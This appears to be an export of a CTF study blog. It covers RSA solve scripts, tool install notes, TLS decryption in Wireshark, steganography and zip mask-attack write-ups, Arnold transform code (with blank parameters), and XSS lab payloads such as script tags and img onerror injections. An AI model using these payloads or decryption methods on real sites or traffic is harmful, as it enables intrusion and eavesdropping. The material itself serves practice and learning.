<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">g1, r1, s1 = gcdext(e1, e2)</span><br><span class="line">g2, r2, s2 = gcdext(g1, e3)</span><br><span class="line"><span class="built_in">print</span>(g2)</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">m = powmod(c1, r1*r2, n)*powmod(c2, r2*s1, n)*powmod(c3, s2, n) % n</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 158364088221424626103916028957988006099747465255174624548375855659785449250446255975244653061928080738353296765</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment"># CnHongKe&#123;e4d0e72e-7589-46a5-973a-cb2a561ab9b5&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h1><ul>
<li>Euler function 2</li>
<li>fermat factor</li>
</ul>
<p><strong>task.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p1 = getPrime(<span class="number">256</span>)</span><br><span class="line">p2 = gmpy2.next_prime(p1)</span><br><span class="line">q1 = getPrime(<span class="number">256</span>)</span><br><span class="line">q2 = gmpy2.next_prime(q1)</span><br><span class="line">n = p1 * p2 * q1 * q2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n = %s&quot;</span> % <span class="built_in">str</span>(n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;c = %s&quot;</span> % <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 64167976067579049714960625453369319623574147507612434283986049223337768780480307767872484679214997588434480836733456745370562072077109044069294552424055163225824033286416753073591864962033181307822913035174676405849974928866646899569297852568167037383571518655075260561571463850326020102574832776970253538663</span></span><br><span class="line"><span class="comment"># c = 61862798948167945139222097835309318688214053098609025632041946354708220281670731577734398373186075525909035569024535800893559811995294302363408878574730352951360726686941143742759917076156204564133401228995322937563878389120770732315714920284214472911769619065607001763986611359218449802649142381309774537696</span></span><br></pre></td></tr></table></figure>



<p><strong>Analyse</strong></p>
<p>From the code, we can make a conclusion that the <code>p1</code> and <code>p2</code> are primes which are neighbors, and the <code>q1</code> and <code>q2</code> are the same. </p>
<p>At this time, we can use <code>fermat factor</code> to solve out the different <code>p1</code>, <code>p2</code>, <code>q1</code> and <code>q2</code>. </p>
<p>The <code>n</code>  is <code>Composite number</code> , so we will use <code>Euler function 2</code> to solve out $\varphi(n)$. </p>
<p>We use <code>fermat factor</code> to make a possible list and make sure that the <code>n = p1 * p2 * q1 * q2</code></p>
<h1 id="factor2"><a href="#factor2" class="headerlink" title="factor2"></a>factor2</h1><h1 id="secret-data"><a href="#secret-data" class="headerlink" title="secret_data"></a>secret_data</h1><ul>
<li>change and fix the data</li>
<li>convert data to zip</li>
<li>zip to xlsx</li>
<li>kali-grep to find the flag</li>
</ul>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>cnhongke</tag>
        <tag>multiplicative_homomorphic</tag>
        <tag>euclidean</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-19-Basecrack</title>
    <url>/2022/12/19/22-12-19-basecrack/</url>
    <content><![CDATA[<p>The guidance to install the <code>basecrack</code>.</p>
<span id="more"></span><!--toc-->

<h1 id="INSTALL"><a href="#INSTALL" class="headerlink" title="INSTALL"></a>INSTALL</h1><blockquote>
<p><a href="https://github.com/mufeedvh/basecrack/">https://github.com/mufeedvh/basecrack/</a></p>
</blockquote>
<ul>
<li>git clone <a href="https://github.com/mufeedvh/basecrack.git">https://github.com/mufeedvh/basecrack.git</a></li>
<li>cd basecrack</li>
<li>pip3 install -r requirements.txt</li>
<li>python3 basecrack.py -h</li>
</ul>
<p><em>python2 may get error</em></p>
<h2 id="Support"><a href="#Support" class="headerlink" title="Support"></a>Support</h2><p>Recently: </p>
<ul>
<li>Base16</li>
<li>Base32</li>
<li>Base36</li>
<li>Base58</li>
<li>Base62</li>
<li>Base64</li>
<li>Base64Url</li>
<li>Base85</li>
<li>Ascii85</li>
<li>Base91</li>
<li>Base92</li>
<li>Base100</li>
</ul>
<h1 id="USAGE"><a href="#USAGE" class="headerlink" title="USAGE"></a>USAGE</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">usage: basecrack.py [-h] [-b BASE] [-f FILE] [-m] [-i IMAGE] [-c] [-e] [-o OUTPUT]</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br><span class="line">  -b BASE, --base BASE  Decode a single encoded base <span class="keyword">from</span> argument.</span><br><span class="line">  -f FILE, --file FILE  Decode multiple encoded bases <span class="keyword">from</span> a file.</span><br><span class="line">  -m, --magic           Decode multi-encoded bases <span class="keyword">in</span> one shot.</span><br><span class="line">  -i IMAGE, --image IMAGE</span><br><span class="line">                        Decode base encodings <span class="keyword">from</span> image <span class="keyword">with</span> OCR detection <span class="keyword">or</span> EXIF data.</span><br><span class="line">  -c, --ocr             OCR detection mode.</span><br><span class="line">  -e, --exif            EXIF data detection mode. (default)</span><br><span class="line">  -o OUTPUT, --output OUTPUT</span><br><span class="line">                        Generate a wordlist/output <span class="keyword">with</span> the decoded bases, enter filename</span><br><span class="line">                        <span class="keyword">as</span> the value.</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="EXAMPLE"><a href="#EXAMPLE" class="headerlink" title="EXAMPLE"></a>EXAMPLE</h1><p><a href="base.txt">base</a></p>
<blockquote>
<p>The <code>base.txt</code> is a muti-base, which use base32-&gt;base64-&gt;base64-&gt;base32-&gt;base92-&gt;base100. </p>
</blockquote>
<p>The <code>basecrack</code> now supports the base100. And we can  use the command to solve the problem. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 basecrack.py -f <span class="string">&quot;xxx/base.txt&quot;</span> -m</span><br><span class="line"><span class="comment"># if is just a ciphertext</span></span><br><span class="line"><span class="comment"># python3 basecrack.py -b &quot;ciphertext&quot;</span></span><br></pre></td></tr></table></figure>

<p>The main output: </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[-] Iteration: <span class="number">6</span>                                                                             </span><br><span class="line">[-] Heuristic Found Encoding To Be: Base32                                                   </span><br><span class="line">[-] Decoding <span class="keyword">as</span> Base32: This_is_So_S1mple                                                    </span><br><span class="line">&#123;&#123;&lt;&lt;======================================================================&gt;&gt;&#125;&#125;               </span><br><span class="line">[-] Total Iterations: <span class="number">6</span>                                                                      </span><br><span class="line">[-] Encoding Pattern: Base100 -&gt; Base92 -&gt; Base32 -&gt; Base64 -&gt; Base64 -&gt; Base32              </span><br><span class="line">[-] Magic Decode Finished With Result: This_is_So_S1mple                                     </span><br><span class="line">[-] Finished <span class="keyword">in</span> <span class="number">0.0019</span> seconds                         </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>basecrack</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-15-Gaps</title>
    <url>/2022/12/15/22-12-15-gaps/</url>
    <content><![CDATA[<p>The <code>gaps</code> is aim to complete the puzzle. </p>
<span id="more"></span><!--toc-->

<h1 id="INSTALL"><a href="#INSTALL" class="headerlink" title="INSTALL"></a>INSTALL</h1><ul>
<li>git clone <a href="https://github.com/nemanja-m/gaps.git">https://github.com/nemanja-m/gaps.git</a></li>
<li>cd gaps</li>
<li>pip3 install -r requirements.txt</li>
<li>python3 setup.py install</li>
</ul>
<h1 id="REQUIREMENT"><a href="#REQUIREMENT" class="headerlink" title="REQUIREMENT"></a>REQUIREMENT</h1><p>If <code>pip3 install -r requirements.txt</code> failed, make sure that your environments match the <code>requirements.txt</code>. </p>
<ul>
<li><code>pip3 install numpy</code></li>
<li><code>pip3 install opencv-python</code></li>
<li><code>pip3 install pytest</code></li>
<li><code>pip3 install matplotlib</code></li>
<li><code>pip3 install pillow</code></li>
</ul>
<h1 id="SETUP"><a href="#SETUP" class="headerlink" title="SETUP"></a>SETUP</h1><p>If run <code>python3 setup.py install</code> failed, maybe you have no permit. So run <code>sudo su</code> and <code>python3 setup.py install</code> again. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Using /usr/lib/python3/dist-packages</span><br><span class="line">Finished processing dependencies <span class="keyword">for</span> gaps==<span class="number">1.0</span></span><br></pre></td></tr></table></figure>

<p>Finally, the install is success. </p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>gaps</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-20-Encrypto-Wireshark</title>
    <url>/2022/12/20/22-12-20-Encrypto-Wireshark/</url>
    <content><![CDATA[<p>Some traffic packets may be encrypted. When I import the private key in one case, I canâ€™t get the decrypted packets like http.</p>
<p>FinalIy, I search for this problem and get the solution.</p>
<p>This post aims to make a conclusion about the <code>encrypted-traffic-packets(tls/ssl)</code>. </p>
<span id="more"></span><!--toc-->

<h1 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h1><blockquote>
<p><a href="https://www.cnblogs.com/jasy/p/16157388.html">https://www.cnblogs.com/jasy/p/16157388.html</a></p>
<p><a href="https://www.joji.me/zh-cn/blog/walkthrough-decrypt-ssl-tls-traffic-https-and-http2-in-wireshark/#md-sslkeylogfile">å¦‚ä½•é€šè¿‡WiresharkæŸ¥çœ‹HTTPSã€HTTP&#x2F;2ç½‘ç»œåŒ…ï¼ˆè§£ç TLSã€SSLï¼‰ (joji.me)</a></p>
</blockquote>
<p>Really thank for the article!</p>
<p><em>The second is to edit the configuration of computer, which can be caught in the direct way by using webshell.</em></p>
<h1 id="DECRYPT-TLS-x2F-SSL"><a href="#DECRYPT-TLS-x2F-SSL" class="headerlink" title="DECRYPT TLS&#x2F;SSL"></a>DECRYPT TLS&#x2F;SSL</h1><p>There are three methods to decrypt the encrypted-ssl&#x2F;tls packets.</p>
<ul>
<li>Use the <code>server&#39;s cert</code> or the <code>private-key</code> to decrypt.</li>
<li>Use the <code>ssl-key-log-file</code> to decrypt. </li>
<li>Disable the config setting to decrypt packets which use the <code>Diffie-Hellman-Exchange</code>.</li>
</ul>
<h2 id="Serverâ€™s-cert-x2F-Private-key"><a href="#Serverâ€™s-cert-x2F-Private-key" class="headerlink" title="Serverâ€™s cert&#x2F;Private-key"></a>Serverâ€™s cert&#x2F;Private-key</h2><h3 id="preparation"><a href="#preparation" class="headerlink" title="preparation"></a>preparation</h3><ul>
<li>TLS&#x2F;SSL packets</li>
<li>cert or private-key</li>
<li>wireshark</li>
</ul>
<h3 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h3><p>The TLS&#x2F;SSL packets should not relate to the <code>Diffie-Hellman-Exchange</code> and just a common encrypted packets. </p>
<h4 id="CERT-x2F-PRIVATEKEY"><a href="#CERT-x2F-PRIVATEKEY" class="headerlink" title="CERT&#x2F;PRIVATEKEY"></a>CERT&#x2F;PRIVATEKEY</h4><p>The cert or private-key should not be encrypted. And usually, the private-key is the standard of <code>PKCS#8</code>.</p>
<p>If you have a binary DER, it cannot be used in wireshark, and we ought to make a convert. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openssl pkcs8 -nocrypt -<span class="keyword">in</span> der.key -informat DER -out pem.key -outformat PEM</span><br></pre></td></tr></table></figure>

<ul>
<li><em>der.key: the name and root of DER</em></li>
<li><em>pem.key: the output file</em></li>
</ul>
<p>And, the private-key ought to be like this: </p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/1.png" class="" title="Private-key">

<p>which shows that the beginning is <code>-----BEGIN RSA PRIVATE KEY-----</code>.</p>
<h4 id="DECRYPT-KEY"><a href="#DECRYPT-KEY" class="headerlink" title="DECRYPT KEY"></a>DECRYPT KEY</h4><blockquote>
<p><a href="https://www.openssl.org/docs/manmaster/man1/rsa.html#EXAMPLES">&#x2F;docs&#x2F;manmaster&#x2F;man1&#x2F;rsa.html (openssl.org)</a></p>
</blockquote>
<p>If the beginning is <code>-----BEGIN ENCRYPTED PRIVATE KEY-----</code>, we should decrypt the key in a proper way. </p>
<p>a common command is:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> [source file] -out [outfile]</span><br><span class="line"><span class="comment"># ?Maybe.</span></span><br></pre></td></tr></table></figure>

<h3 id="step"><a href="#step" class="headerlink" title="step"></a>step</h3><ul>
<li>OPEN the wireshark and import the private-key or cert.</li>
</ul>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/2.png" class="" title="setting">

<ol>
<li><strong>RSA keys list.</strong> Import private key, add the <code>port</code>, <code>ip</code>, <code>protocol</code>, <code>root</code> and the chosen <code>password</code>. <strong>Mainly used.</strong> </li>
<li><strong>TLS debug file.</strong> Some debug file.</li>
<li><strong>Master-Secret log.</strong> Key log file.</li>
</ol>
<ul>
<li>If all things right, and we will see the <code>http traffic</code>.</li>
</ul>
<h2 id="Key-log-file"><a href="#Key-log-file" class="headerlink" title="Key log file"></a>Key log file</h2><p>Use the <code>key log file</code>. Usually, this file is in the traffic packets. The key log file is like this.</p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/3.png" class="" title="key log file">

<h2 id="Relate-to-D-H"><a href="#Relate-to-D-H" class="headerlink" title="Relate to D-H"></a>Relate to D-H</h2><p>Sometimes, the encrypted traffic packets cannot be decrypted by using methods above. </p>
<h3 id="how-to-recognize"><a href="#how-to-recognize" class="headerlink" title="how to recognize"></a>how to recognize</h3><p>When we analyze the traffic packets, we use command like <code>ip.addr == xxx.xxx.xxx.xxx &amp;&amp; tls</code> to find the target packets. </p>
<p>If we see the <code>Client Hello</code>, we should make a notice that it maybe a <code>D-H encrypted traffic packet</code>. </p>
<p>For example: </p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/4.png" class="" title="D-H encrypted">

<p>We can change the browser to catch the traffic again.</p>
<h3 id="set-the-firefox"><a href="#set-the-firefox" class="headerlink" title="set the firefox"></a>set the firefox</h3><p>The address is <code>about:config</code>, and search for the <code>dhe</code>. </p>
<p>We can change the target according to the traffic packets or make all things   <code>false</code>. </p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/5.png" class="" title="change firefox setting">

<h3 id="recatch-the-traffic-and-analyze"><a href="#recatch-the-traffic-and-analyze" class="headerlink" title="recatch the traffic and analyze"></a>recatch the traffic and analyze</h3><img src="/2022/12/20/22-12-20-Encrypto-Wireshark/6.png" class="" title="remove dhe">

<p>After importing the private key, we can see the  decrypted<code>http traffic</code>. </p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/7.png" class="" title="decrypted http traffic">

<h1 id="CONCLUSION"><a href="#CONCLUSION" class="headerlink" title="CONCLUSION"></a>CONCLUSION</h1><p>The <code>Diffie-Hellman-Exchange</code> is really beyond my imagination. </p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
        <tag>diffie_hellman</tag>
      </tags>
  </entry>
  <entry>
    <title>23-02-14-Abstract</title>
    <url>/2023/02/14/23-02-14-Abstract/</url>
    <content><![CDATA[<p>I am reading <em>Ideal, varieties, and algorithms</em>, however I havenâ€™t learnt the abstract algebra. Thus I will make some records for some typical definitions, which can help me learn well about this book. </p>
<span id="more"></span><!--toc-->

<h1 id="Fields-and-Rings"><a href="#Fields-and-Rings" class="headerlink" title="Fields and Rings"></a>Fields and Rings</h1><p><strong>Def1</strong> a set $k$ and two binary operations $\cdot$ and $+$ defined on $k$.</p>
<h2 id="Conditions"><a href="#Conditions" class="headerlink" title="Conditions"></a>Conditions</h2><ul>
<li>$(a + b) + c &#x3D; a + (b + c)$ and $(a \cdot b) \cdot c &#x3D; a \cdot(b \cdot c)$ for all $a, b, c$</li>
</ul>
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>abstract</tag>
        <tag>basic</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-21-UNknown</title>
    <url>/2022/12/21/22-12-21-UNknown/</url>
    <content><![CDATA[<p>Figure out 2 tasks. </p>
<p>One is for crypto, and the other is for misc. </p>
<p>Both of them are easy. </p>
<span id="more"></span><!--toc-->

<h1 id="poem"><a href="#poem" class="headerlink" title="poem"></a>poem</h1><blockquote>
<p>reference: [ACTFæ–°ç”Ÿèµ›2020]base64éšå†™</p>
</blockquote>
<ul>
<li>base64stego</li>
<li>caeser cipher</li>
</ul>
<h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p><a href="22-12-21-UNknown/poem.txt">poem.txt</a></p>
<p><em>Make sure that the end of each line. This ending is <code>\r\n</code></em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">base64stego</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;poem.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># print(f.readlines())</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="built_in">str</span>(line, <span class="string">&#x27;utf-8&#x27;</span>).strip(<span class="string">&#x27;\r\n&#x27;</span>) <span class="comment"># edit</span></span><br><span class="line">        <span class="comment"># print(stegb64)</span></span><br><span class="line">        row64 = <span class="built_in">str</span>(base64.b64encode(base64.b64decode(stegb64)), <span class="string">&#x27;utf-8&#x27;</span>).strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]) - b64chars.index(row64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">    output = [<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(output)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="caeser-cipher"><a href="#caeser-cipher" class="headerlink" title="caeser cipher"></a>caeser cipher</h2><p><em>Just crack!</em></p>
<p>key is <code>13</code>.</p>
<h1 id="Alex2Bob"><a href="#Alex2Bob" class="headerlink" title="Alex2Bob"></a>Alex2Bob</h1><p><a href="22-12-21-UNknown/Alex2Bob.zip">Alex2Bob</a></p>
<ul>
<li>ARCHPR-mask</li>
<li>PNG-header</li>
<li>PNG-crack width</li>
<li>LSB</li>
</ul>
<h2 id="ARCHPR-mask"><a href="#ARCHPR-mask" class="headerlink" title="ARCHPR-mask"></a>ARCHPR-mask</h2><p>Known the end of the key is <code>kitty</code>.</p>
<p>This is the <code>mask attack</code>. We donâ€™t know the length of the key, so we try some possibilities. </p>
<p>Until we try to set unknown length is 4, we get the key. </p>
<img src="/2022/12/21/22-12-21-UNknown/1.png" class="" title="setting&amp;output">

<h2 id="PNG-header"><a href="#PNG-header" class="headerlink" title="PNG-header"></a>PNG-header</h2><p>Use the <code>winhex</code> and analyze the png. We find that the file header is wrong, so we should edit the file header <code>88 -&gt; 89</code>. </p>
<img src="/2022/12/21/22-12-21-UNknown/2.png" class="" title="PNG-header">

<p>Still canâ€™t open the picture or see the content. </p>
<h2 id="PNG-crack-width"><a href="#PNG-crack-width" class="headerlink" title="PNG-crack width"></a>PNG-crack width</h2><p>Crack the true width, and we will get the width is <code>0x260</code>. </p>
<img src="/2022/12/21/22-12-21-UNknown/3.png" class="" title="real width">

<p>Edit the width by winhex or 010Editor, and we will get the real picture. </p>
<img src="/2022/12/21/22-12-21-UNknown/newcat.png" class="" title="newcat">

<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>Two ways to get the information embedded in LSB. </p>
<ul>
<li>stegsolve-original</li>
<li>zsteg</li>
</ul>
<img src="/2022/12/21/22-12-21-UNknown/4.png" class="" title="stegsolve-original">

<img src="/2022/12/21/22-12-21-UNknown/5.png" class="" title="zsteg">

<p>The cipher is <code>ZmxhZ3tsb3ZlX3JhZ2RvbGxfY2F0fQ==</code>, and base64 decode. </p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>base64steg</tag>
        <tag>mask_attack</tag>
        <tag>lsb</tag>
      </tags>
  </entry>
  <entry>
    <title>Arnold Transform</title>
    <url>/2023/07/04/Arnold-Transform/</url>
    <content><![CDATA[<p>AKA <code>cat map</code>.</p>
<p>The classic <code>Arnold Transform</code> is a two-dimensional reversible map. The discrete form of the <code>Arnold Transform</code> is periodic and changes with the size of the image.</p>
<span id="more"></span><!--toc-->

<h1 id="Special-Arnold-Transform"><a href="#Special-Arnold-Transform" class="headerlink" title="Special Arnold Transform"></a>Special Arnold Transform</h1><h2 id="Def-1"><a href="#Def-1" class="headerlink" title="Def.1"></a>Def.1</h2><p>$$<br>\begin{bmatrix}<br>    xâ€™\\<br>    yâ€™<br>\end{bmatrix}<br>&#x3D;<br>A<br>\begin{bmatrix}<br>    x\\<br>    y<br>\end{bmatrix}<br>\mod N, A &#x3D;<br>\begin{bmatrix}<br>    1 &amp; 1 \\<br>    1 &amp; 2<br>\end{bmatrix}<br>, 0\le x, y \le 1, 0\le xâ€™, yâ€™ \le 1<br>$$</p>
<p>$$<br>\Longrightarrow<br>\left\{<br>\begin{array}{lr}<br>    xâ€™ &#x3D; (x + y) \mod N \\<br>    yâ€™ &#x3D; (x + 2y) \mod N<br>\end{array}<br>\right.<br>$$<br>Two-dimensional Arnold Transform.</p>
<h2 id="Def-2"><a href="#Def-2" class="headerlink" title="Def.2"></a>Def.2</h2><p>$$<br>\begin{bmatrix}<br>    x\\<br>    y<br>\end{bmatrix}<br>&#x3D;<br>A^{-1}<br>\begin{bmatrix}<br>    xâ€™\\<br>    yâ€™<br>\end{bmatrix}<br>\mod N, A^{-1} &#x3D;<br>\begin{bmatrix}<br>    2 &amp; -1 \\<br>    -1 &amp; 1<br>\end{bmatrix}<br>, 0\le x, y \le 1, 0\le xâ€™, yâ€™ \le 1<br>$$</p>
<p>$$<br>\Longrightarrow<br>\left\{<br>\begin{array}{lr}<br>    x &#x3D; (2xâ€™ - yâ€™) \mod N \\<br>    y &#x3D; (-xâ€™ + yâ€™) \mod N<br>\end{array}<br>\right.<br>$$</p>
<p>Two-dimensional Arnold inverse transformation. </p>
<h1 id="General-Arnold-Transform"><a href="#General-Arnold-Transform" class="headerlink" title="General Arnold Transform"></a>General Arnold Transform</h1><h2 id="Def-1-1"><a href="#Def-1-1" class="headerlink" title="Def.1"></a>Def.1</h2><p>$$<br>\begin{bmatrix}<br>    xâ€™\\<br>    yâ€™<br>\end{bmatrix}<br>&#x3D;<br>\begin{bmatrix}<br>    1 &amp; a \\<br>    b &amp; ab + 1<br>\end{bmatrix}<br>\begin{bmatrix}<br>    x\\<br>    y<br>\end{bmatrix}<br>\mod N<br>$$</p>
<p>$$<br>\Longrightarrow<br>\left\{<br>\begin{array}{lr}<br>    xâ€™ &#x3D; (x + ay) \mod N \\<br>    yâ€™ &#x3D; (bx + (ab + 1)y) \mod N<br>\end{array}<br>\right.<br>$$</p>
<h2 id="Def-2-1"><a href="#Def-2-1" class="headerlink" title="Def.2"></a>Def.2</h2><p>$$<br>\begin{bmatrix}<br>    x\\<br>    y<br>\end{bmatrix}<br>&#x3D;<br>\begin{bmatrix}<br>    ab + 1 &amp; -a \\<br>    -b &amp; 1<br>\end{bmatrix}<br>\begin{bmatrix}<br>    xâ€™\\<br>    yâ€™<br>\end{bmatrix}<br>\mod N<br>$$</p>
<p>$$<br>\Longrightarrow<br>\left\{<br>\begin{array}{lr}<br>    x &#x3D; ((ab + 1)xâ€™ - ayâ€™) \mod N \\<br>    y &#x3D; (-bxâ€™ + yâ€™) \mod N<br>\end{array}<br>\right.<br>$$</p>
<h1 id="Accomplish"><a href="#Accomplish" class="headerlink" title="Accomplish"></a>Accomplish</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold</span>(<span class="params">image, arnold_times</span>):</span><br><span class="line">    a = </span><br><span class="line">    b = </span><br><span class="line">    <span class="comment"># Create a new image, a three-dimensional array of all 0s</span></span><br><span class="line">    decode_image = np.zeros(shape=image.shape)</span><br><span class="line">    <span class="comment"># Read the length and width pixels of the picture</span></span><br><span class="line">    height, width = image.shape[<span class="number">0</span>], image.shape[<span class="number">1</span>]</span><br><span class="line">    N = height  <span class="comment"># if it is a square, height is equal to width</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(arnold_times):  <span class="comment"># transformation times</span></span><br><span class="line">        <span class="comment"># Traverse the pixel coordinates of the image</span></span><br><span class="line">        <span class="keyword">for</span> old_x <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            <span class="keyword">for</span> old_y <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">                <span class="comment"># Arnold Inverse Transform</span></span><br><span class="line">                new_x = ((a * b + <span class="number">1</span>) * old_x + (-a) * old_y) % N <span class="comment"># N = height</span></span><br><span class="line">                new_y = ((-b) * old_x + old_y) % N <span class="comment"># N = width</span></span><br><span class="line">                <span class="comment"># Arnold Transform</span></span><br><span class="line">                <span class="comment"># new_x = (old_x + a * old_y) % N # N = height</span></span><br><span class="line">                <span class="comment"># new_y = (b * old_x + (a * b + 1) * old_y) % N # N = width</span></span><br><span class="line"></span><br><span class="line">                decode_image[new_x, new_y, :] = image[old_x, old_y, :]</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;xxx&#x27;</span>, decode_image, [<span class="built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="number">0</span>])  <span class="comment"># write as PNG</span></span><br><span class="line">    <span class="keyword">return</span> decode_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># imread(path,flag) reads the picture, the default parameter value of loading a color picture is flag=1, the grayscale is 0, the transparency is -1, the result is a three-dimensional array, the first two dimensions are pixel coordinates, and the last one is the channel index</span></span><br><span class="line">    it = cv2.imread(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line">    arnold(it, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>cat</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-30-XSS</title>
    <url>/2022/12/30/22-12-30-XSS/</url>
    <content><![CDATA[<blockquote>
<p><a href="https://xss.haozi.me/#/0x00">alert(1) (haozi.me)</a></p>
</blockquote>
<p>Make a record. </p>
<span id="more"></span><!--toc-->

<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p><strong>No filtration.</strong> Just insert code normally. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x00.png" class="" title="0x00">



<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><ul>
<li><strong>End the label.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x01-1.png" class="" title="0x01-1">



<ul>
<li>End the label. <strong>IMG label error.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;img src=&quot;&quot; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x01-2.png" class="" title="0x01-2">



<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p><strong>End the html code.</strong> </p>
